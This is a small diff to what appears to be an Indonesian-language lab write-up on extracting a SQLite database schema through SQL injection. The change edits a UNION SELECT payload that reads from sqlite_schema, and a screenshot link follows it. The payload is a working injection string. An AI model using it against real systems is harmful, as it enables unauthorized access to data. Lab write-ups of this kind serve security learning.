@@ -56,7 +56,7 @@ Describe: Exfiltrate the entire DB schema definition via SQL Injection.
 
     Setelah mengetahui jumlah kolom, dilakukan percobaan untuk menampilkan struktur database dari tabel internal SQLite:
     ```bash
-    apple'))+UNION+SELECT+'a','a','a','a','a','a','a','a',sql+FROM+sqlite_schema--
+    apple'))+UNION+SELECT+'4','4','4','4','4','4','4','4',sql+FROM+sqlite_schema--
     ```
     <img width="1919" height="1016" alt="Cuplikan layar 2025-09-10 151255" src="https://github.com/user-attachments/assets/8af7c955-5f2b-4a2f-bd19-da674260aa2b" />
 
